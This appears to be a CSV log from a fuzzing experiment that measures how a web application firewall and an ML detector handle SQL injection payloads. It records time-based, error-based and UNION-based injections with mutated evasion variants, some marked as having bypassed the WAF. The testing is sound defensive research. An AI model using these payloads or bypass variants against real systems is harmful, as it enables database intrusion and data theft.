Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
11,2024-12-16T20:25:55.243723,"select pg_sleep  (  5  )   and ""%""  =  """,403,403,200,waf_correct_ml_incorrect,"SElect pg_sleep  (	  AND 't>'='t>'  )  /**/aND ""%""   like   """,2024-12-16T20:25:57.270280,403,403,both_correct,"sELECt pg_sleep  (	  ANd 't>'='t>'  )   ANd ""%""   LiKE  	""",2024-12-16T20:26:01.200075,403,200,waf_correct_ml_incorrect,"SElect pg_sleep  (	 
ANd 't>' lIKe 't>'  ) /*Kch(*/ AND ""%""   Like  	""",2024-12-16T20:26:05.123107,403,200,waf_correct_ml_incorrect,"sELECt pg_sleep  (  
ANd/*t(Q*/'t>' LiKE 't>'  ) /*Kch(*/ && ""%""   liKe  	""",2024-12-16T20:26:09.519125,403,200,waf_correct_ml_incorrect,"sELect pg_sleep  (  
and/*t(Q*/'t>' LIKE 't>' /**/) /*Kch(*/  AND  ""%""   lIKE  
""",2024-12-16T20:26:14.127600,403,200,waf_correct_ml_incorrect
12,2024-12-16T20:26:19.016537,"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",403,403,200,waf_correct_ml_incorrect,"(SELECT 'X'='X')  )   || extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  SeLEct   (  elt  (  1297  =/**/ 1297,1   )  
 )     )  ,0x717a767a71   )    )    ANd   (  1185  =  (SELECT 1)",2024-12-16T20:26:27.220166,403,403,both_correct,"(sELEcT 'X'='X')  )   ||/**/extractvalue  (  4135!=4136,concat  (  0x5c,0x7171706a71,  (  SEleCT   (  elt  (   OR 0   LIKE /**/ 1297,1   )  
 )     )  ,0x717a767a71   )    )    ANd   (  (SELECT 1185) 	=  (SELeCt 1)",2024-12-16T20:26:37.266485,403,200,waf_correct_ml_incorrect,"(SELEct 'X'='X')  )   ||/**/extractvalue  (/**/ 'z' LiKe 'z'!=4136,concat  (  0x5c,0x7171706a71,  (  SELeCT   (  elt  (   OR (SELECT 0)   lIKe /**/  || 0,1   )  	 )     )  ,0x717a767a71   )    )    aNd   (  (SELECT 1185) 	=  (seLEcT 1)",2024-12-16T20:26:48.576584,403,403,both_correct,"(sELEct 'X'='X')  )   ||/**/extractvalue  (  'z' LiKe 'z'!=4136,concat  (  0x5c,0x7171706a71,  (  SEleCt   (  elt  (   Or (SELect (sELECt 0))   lIKE /**/   or  0,1   ) 		 )     )  ,0x717a767a71   )    )    aNd   (  (sEleCT (SeLecT 3760!=3761)) 	=  (sELECT 1)",2024-12-16T20:27:00.629058,403,200,waf_correct_ml_incorrect,"(sELecT 'X'='X')  )   ||/**/extractvalue  (  'z' LIkE 'z'!=4136,concat  (  0x5c,0x7171706a71,  (  seLeCt   (  elt  (   OR (selEcT (SeLEcT ')>{cZ'<>')>{cZ1'))   LIKE /**/   oR  0,1   ) 		 )  /**/  )  ,0x717a767a71   )   	)    And   (  (SelEct (selEcT  aND 1 NOT LIKE (SELECT 3761))) 	=  (selECT 1)",2024-12-16T20:27:14.303245,403,200,waf_correct_ml_incorrect
13,2024-12-16T20:27:29.192568,1' where 3188  =  3188 and 9198  =  9198--,403,403,403,both_correct," OR 0' WHEre 3188  =  528!=529/**/ANd 9198
  LIKE   (SELECT 9198)--",2024-12-16T20:27:31.314318,403,403,both_correct," || 0'
Where 3188  =  0x210!= OR 0!=9776/*GO*/And 9198
  LIkE/**/  (sElecT 9198)--",2024-12-16T20:27:35.522130,200,200,both_incorrect," || 0x0'
Where 3188  =  0x210!= OR/**/'Y'='Y'<> AND 1/*GO*/And 9198	  liKe/**/  (sELECt 9198)--",2024-12-16T20:27:40.738129,200,200,both_incorrect," || 0x0'
Where 'C5}'='C5}' 	=  0x210!= OR/**/'Y'='Y'!=/**/ANd  AnD 1/*]*/aNd 0x23ee	  LIKe/**/  (sElEct 9198)--",2024-12-16T20:27:46.233639,200,200,both_incorrect, || 0x0' Where 'C5}'='C5}' 	= /**/0x210!= OR/**/'Y'='Y'!=/*&z*/And  AND 1/*]*/aND 0x23ee	  LiKE/**/  (sELeCT (SELECT 1) NOT LIKE 0xb2e)--,2024-12-16T20:27:52.504784,200,403,waf_incorrect_ml_correct
14,2024-12-16T20:28:00.089424,-9405' union all select 2539--,403,403,403,both_correct,- OR 0 LiKe 0x672' union/**/all SeLeCT	2539--,2024-12-16T20:28:01.668094,403,200,waf_correct_ml_incorrect,- or 0x0 LIkE 0x672' union all SELeCt  aND 'e'<>'e('--,2024-12-16T20:28:05.110925,403,403,both_correct,"- Or/**/0x0 liKE 0x672' union all SELeCt 
aND 'e'<>'e('--",2024-12-16T20:28:08.816561,403,403,both_correct,- oR/**/0x0 liKe 0x672' union all SELeCt 	aND/**/'e'<>'e('--,2024-12-16T20:28:12.596897,403,403,both_correct,- Or/**/0x0 LiKE 0x672'/**/union all SELeCt  aND/**/'e'<>'e('--,2024-12-16T20:28:16.526640,403,200,waf_correct_ml_incorrect
15,2024-12-16T20:28:20.643604,rhett,200,200,200,both_correct,rhett,2024-12-16T20:28:21.025137,200,200,both_correct,rhett,2024-12-16T20:28:22.393076,200,200,both_correct,rhett,2024-12-16T20:28:23.760705,200,200,both_correct,rhett,2024-12-16T20:28:25.119022,200,200,both_correct,rhett,2024-12-16T20:28:26.478971,200,200,both_correct
16,2024-12-16T20:28:27.862510,calle capitan palacios 71,200,200,200,both_correct,"calle
capitan palacios/**/(SELECt 'vL?'='vL?')",2024-12-16T20:28:29.172880,200,403,waf_correct_ml_incorrect,"calle
capitan palacios/**/(seLECT/**/'vL?'
likE 'vL?')",2024-12-16T20:28:32.465171,200,200,both_correct,"calle
capitan/**/palacios/**/(sElECt/**/'vL?'
liKe
'vL?')",2024-12-16T20:28:36.187403,200,200,both_correct,"calle/**/capitan/*>
b`*/palacios/**/(SElEct/**/'vL?'
LIKe
'vL?')",2024-12-16T20:28:40.054704,200,200,both_correct,"calle/**/capitan/*>
b`*/palacios	(SeLECt/**/'vL?'
liKE
'vL?')",2024-12-16T20:28:44.288829,200,200,both_correct
17,2024-12-16T20:28:48.250522,"1'  )   union all select null,null,null,null,null--",403,403,403,both_correct," && 'R'='R'' /**/)  	union all Select null,null,null,null,null--",2024-12-16T20:28:50.769139,403,403,both_correct,"  anD  (selECT (Select '^' NOT LIKE '^_'))'/*/*//**/)   union all SeleCT null,null,null,null,null--",2024-12-16T20:28:55.011814,403,403,both_correct,"  aNd  (SeLEcT (sEleCT '^' not like '^_'))'/*/*/ ) 
 union all sElECt null,null,null,null,null--",2024-12-16T20:29:00.753959,403,403,both_correct,"  anD  (selECt (sELeCt '^' not like/**/'^_'))'/*/*/ ) 	 union all sELecT null,null,null,null,null--",2024-12-16T20:29:06.324033,403,403,both_correct,"  ANd  (sEleCt (SELect '^' not like '^_'))'/*/*/ ) 
 union all SeLect null,null,null,null,null--",2024-12-16T20:29:12.254940,403,403,both_correct
18,2024-12-16T20:29:17.735634,"1'  )   as dwgv where 1525  =  1525 union all select null,null--",403,403,403,both_correct," OR 0'  ) /**/ as dwgv WherE 'K'='K'
  LIKE   0x5f5 union all selEcT null,null--",2024-12-16T20:29:20.813972,403,403,both_correct," Or (SELECT (SELECT 8686) NOT LIKE 8687)'  )   as dwgv WherE 'K'='K'
 
LIKe   0x5f5 union all seLeCT null,null--",2024-12-16T20:29:25.568400,403,403,both_correct," or (selEcT (sELect (SELect 8686)) NOT LIKE (Select '8'='8'))'  )   as dwgv WherE
'K'='K'
 
lIKe   0x5f5 union/**/all SEleCt null,null--",2024-12-16T20:29:31.836188,200,403,waf_incorrect_ml_correct," Or (SELect (SElecT/**/(sELEct 8686)) NOT LIKE (sElECt '8' lIKE ' AND 0x1!=5419'))'  )   as dwgv WherE
'K'='K'  
LIKe   0x5f5 union/**/all SeLEcT null,null--",2024-12-16T20:29:39.588209,200,403,waf_incorrect_ml_correct," OR (sELEct (seLect/**/(SEleCT 8686)) not like (SelECt '8' LiKE ' AND 0x1!=(SELECT 3522!=(SELECT 3523))'))'  )   as dwgv WherE	'K'='K'  
LiKE/*z	&*/  0x5f5 union/**/all SeleCT null,null--",2024-12-16T20:29:48.027163,200,403,waf_incorrect_ml_correct
19,2024-12-16T20:29:57.864117,29056,200,200,200,both_correct,"(SELECT/**/4681 NOT LIKE
(SELECT 4682))",2024-12-16T20:29:58.245951,403,403,both_incorrect,(sELeCt/**/'0' like '(SELECT/**/1)' NOT LIKE (sElect 0x124a)),2024-12-16T20:30:01.209586,403,403,both_incorrect,(sElect/*y.SLm*/'0x0' Like	'(SELECT/**/ AND 9072 NOT LIKE 9073)'/**/not like (sElECT 0x124a)),2024-12-16T20:30:05.441396,403,403,both_incorrect,(SElECt/*y.SLm*/'0x0' LIKE '(SELECT  AND 'V5'='V5' NOT LIKE (SELECT  OR 0))'/**/not like (sElEct 0x124a)),2024-12-16T20:30:10.938973,403,403,both_incorrect,"(seleCt/*vm!&
*/'0x0' liKe '(SELECT  AND 'V5'='V5' NOT LIKE (SELECT
 OR (SELECT 8616 LIKE  OR 0)))' not like (SEleCt 0x124a))",2024-12-16T20:30:16.967788,403,403,both_incorrect
20,2024-12-16T20:30:24.002534,1%'   )    )    and 9198  =  9198--,403,403,200,waf_correct_ml_incorrect, AND 0x1%'   )    )    and '.' NOT LIKE '.('  	LIke /*)p*/ 9198--,2024-12-16T20:30:25.749626,403,403,both_correct," ANd 0x1%'   )    )    and '.' NOT LIKE '.('/**/
	LiKe /*)p*/ 121 not like (SELECT (SELECT 1))--",2024-12-16T20:30:29.897100,403,403,both_correct, anD 0x1%'/**/  )    )    and '.' NOT LIKE '.('/*A*/		LikE /*)p*/  and 'o-k'!='o-kA' not like (SELeCt (SELecT (SELECT 1)))--,2024-12-16T20:30:35.822681,403,403,both_correct," ANd 0x1%'   )    )    and '.' NOT LIKE '.('/**/		LikE /*)p*/  and 'o-k'!='o-kA' not like (SelecT (seLecT (sELeCt
 anD 4814<>(SELECT 4815))))--",2024-12-16T20:30:42.794553,403,403,both_correct," ANd 0x1%'   )    )    and	'.' NOT LIKE '.('/*ho{&*/		LikE /*)p*/  and 'o-k'!='o-kA'/**/not like (sElecT (SelECT (sElect
 anD 4814 not like (sELect  AND 1 lIkE (SELECT 3158)))))--",2024-12-16T20:30:50.725487,403,403,both_correct
21,2024-12-16T20:31:00.363336,"-8454"" or 6872  =  6872",403,403,200,waf_correct_ml_incorrect,"-7587 NOT LIKE 7588"" or  AND 1 /**/ like 
 0x1ad8",2024-12-16T20:31:01.602491,200,403,waf_incorrect_ml_correct,"-7587 not like (SELECT 1711) LIKE (SELECT 1)""/**/oR  anD 1 /**/ LiKE 
	0x1ad8",2024-12-16T20:31:04.996990,403,403,both_correct,"- aND 1 not like (Select (SELECt 1711)) LIke (SElECt 1)"" oR  AnD 'JC'!='JCB' /**/ LikE  	0x1ad8",2024-12-16T20:31:09.674540,403,403,both_correct,"- aNd (SelECt 1) not like (seleCt (sELect 1711)) liKe (SeLEcT  OR 0<>1682)"" Or  aND 'JC'<>'JCB' /**/ lIKe/**/ 
0x1ad8",2024-12-16T20:31:15.266883,403,200,waf_correct_ml_incorrect,"- AnD (sElect  && 1) not like (sElEcT (selECT 1711)) like/**/(SeleCt  Or 'G|z' NOT LIKE 'G|zQ'<>(selEct 1682))"" Or  and 'JC'<>'JCB' /**/ lIke/**/  0x1ad8",2024-12-16T20:31:21.818375,403,200,waf_correct_ml_incorrect
22,2024-12-16T20:31:30.319823,"c/ concepcion alexandre 82,",200,200,200,both_correct,"c/	concepcion alexandre (SELECT (SELECT 'FE' NOT/**/LIKE 'FEs')),",2024-12-16T20:31:31.719720,200,403,waf_correct_ml_incorrect,"c/
concepcion alexandre (SELeCt (selecT 'FE'/**/NOT/*(SELECT  OR 0)$*/lIkE 'FEs')),",2024-12-16T20:31:35.857480,200,403,waf_correct_ml_incorrect,"c/
concepcion	alexandre (seleCT (sELect 'FE'/*6AJo*/NOT/*(SELECT  OR/**/ OR (SELECT ':'<>':s'))$*/LiKe 'FEs')),",2024-12-16T20:31:40.887100,200,403,waf_correct_ml_incorrect,"c/ concepcion	alexandre (sELect/**/(sELECt 'FE'/**/NOT/*(SELECT  OR/*V~*/ oR (SelecT ':'!=':s'))$*/LikE 'FEs')),",2024-12-16T20:31:47.212620,200,200,both_correct,"c/ concepcion
alexandre/**/(SELEct/*MS*/(sELeCT 'FE'/**/NOT/*(SELECT  OR/*V~*/ or (SElEct ':'<>':s'))$*/lIKe 'FEs')),",2024-12-16T20:31:53.609170,200,200,both_correct
23,2024-12-16T20:32:00.459688,"c/ torre, 23",200,200,200,both_correct,"c/	torre,/**/'v^ML|'!='v^ML|P'",2024-12-16T20:32:01.174182,200,200,both_correct,"c/	torre,	'v^ML|' NOT LIKE 'v^ML|P'",2024-12-16T20:32:03.711514,200,403,waf_correct_ml_incorrect,"c/	torre,	'v^ML|' not/**/like	'v^ML|P'",2024-12-16T20:32:06.514602,200,200,both_correct,"c/	torre,
'v^ML|'/**/not/*(*/liKE	'v^ML|P'",2024-12-16T20:32:09.455790,200,200,both_correct,"c/	torre, 'v^ML|' not/*(*/liKE	'v^ML|P'",2024-12-16T20:32:12.517193,200,200,both_correct
24,2024-12-16T20:32:15.425300,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'cogk'  =  'cogk",403,403,403,both_correct,"7907=7907'  )   or row  (  0x415,7562  ) 	>  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  * OR 0   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and  /**/(  'cogk'  =  'cogk",2024-12-16T20:32:30.868906,403,403,both_correct,"0x1ee3 like 7907'  )   or row  (  0x415,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  ( /**/rand  (  0  )  * OR 0   )    )   x from   (  select 8488 union select 6053 LIKE 6053 union select 3051 union select  OR 0  )  a group by x  )   and  /*s*/(  'cogk'  =  'cogk",2024-12-16T20:32:47.871568,403,403,both_correct,"0x1ee3 Like 7907'  )   or row  (  0x415,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  * OR	0   )    )   x from   (  select 8488 union select 6053 LIKE  AND 1 union select 9149=(SELECT 9149) union select  OR 0  )  a group by x  )   and  /**/(  'cogk'  =  'cogk",2024-12-16T20:33:05.787745,403,403,both_correct,"0x1ee3 LIKe (SELECT 7907)'  )   or row  (  0x415,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   AND 1  =  1045,1   )/**/   )     )  ,0x717a767a71,floor  (  rand  (  0  )  *
OR	0   )    )   x from   (  select 8488 union select 6053 LIKE  AND 6705=6705 union select 9149=(SELECT 9149) union select  OR 0  )  a group by x  )   and  /*T{Bq*/(  'cogk'  =  'cogk",2024-12-16T20:33:24.450520,403,403,both_correct,"0x1ee3 like (SelecT 7907)'  )   or row  (  0x415,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (   AND (SELECT 1)  =  3426=3426,1   )/*T=*/   )     )  ,0x717a767a71,floor  (  rand  (  0  )  *
OR
0   )    )   x from   (  select 8488 union select 6053 LIKE  AND (SELECT 6705)=6705 union select 9149=(SELECT 9149) union select  OR 0  )  a group by x  )   and  /*T{Bq*/(  'cogk'  = /**/'cogk",2024-12-16T20:33:44.484664,403,403,both_correct
25,2024-12-16T20:34:05.734924,matney,200,200,200,both_correct,matney,2024-12-16T20:34:06.177024,200,200,both_correct,matney,2024-12-16T20:34:07.599682,200,200,both_correct,matney,2024-12-16T20:34:09.036120,200,200,both_correct,matney,2024-12-16T20:34:10.465005,200,200,both_correct,matney,2024-12-16T20:34:11.903494,200,200,both_correct
